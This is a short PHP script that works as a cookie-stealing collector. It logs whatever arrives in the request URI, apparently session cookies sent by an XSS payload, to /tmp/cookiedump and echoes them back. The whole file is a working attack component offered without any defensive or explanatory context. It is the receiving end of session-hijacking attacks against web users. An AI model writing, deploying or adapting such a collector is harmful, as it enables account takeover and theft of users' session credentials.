<?php
$cookies = $_SERVER['REQUEST_URI'];
$output = "Recieved=".$cookies."\n";
$fh = fopen("/tmp/cookiedump", "a+");
$contents = fwrite($fh, $output);
fclose($fh);
echo "Following cookies written to /tmp/cookiedump:<br>" . $cookies;
?>